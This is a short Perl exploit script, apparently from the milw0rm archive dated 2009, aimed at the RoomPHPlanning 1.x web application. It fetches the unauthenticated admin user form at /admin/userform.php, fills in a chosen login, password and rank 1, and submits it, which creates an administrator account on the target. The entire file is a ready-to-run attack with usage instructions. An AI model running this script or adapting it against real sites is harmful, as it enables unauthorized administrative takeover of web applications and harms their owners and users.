#!/usr/bin/perl -w

use LWP::UserAgent;
use HTML::Form;

	print "_________________________________________________________\n";
	print "[+]=>RoomPHPlanning\n";
	print "[+]=>v1.x\n";
	print "[+]=>Vul: Remote Create user with all permissions (admin)\n";
	print "[+]=>Author: Jonathan Salwan \n";
	print "[+]=>Web: http://www.shell-storm.org\n";
	print "[+]=>Mail: submit [AT] shell-storm.org\n";
	print "_________________________________________________________\n\n";
    
sub usage {
	print "[+]=>usage: <file.pl> <host_&_patch> <login> <password>\n";
	print "[+]=>Ex: flood.pl http://localhost/patch/ admin2 toto\n";exit;
}

if ($#ARGV < 2) {usage();}

	$patch 	= "/admin/userform.php";
	$host 	= $ARGV[0].$patch;
	$login 	= $ARGV[1];
	$pwd 	= $ARGV[2];
	$name 	= "Administrateur";
	$rank 	= "1";

		print "[+]=>Sending...\n";


    			my $u = LWP::UserAgent->new(agent => 'Mozilla/4.73 [en] (X11; I; Linux 2.2.16 i686; Nav)' );
			my $req = HTTP::Request->new( GET => "${host}" );
			my $res = $u->request($req);
			my $send = HTML::Form->parse( $res->content, $host );

    	$send->find_input('name')->value($name);
    	$send->find_input('login')->value($login);
    	$send->find_input('pwd')->value($pwd);		
	$send->find_input('rank')->value($rank);    	
	
	$u->request( $send->click );

		print "[+]=>Done!\n";
		print "[+]=>Now, user $ARGV[1] is admin\n";

# milw0rm.com [2009-03-10]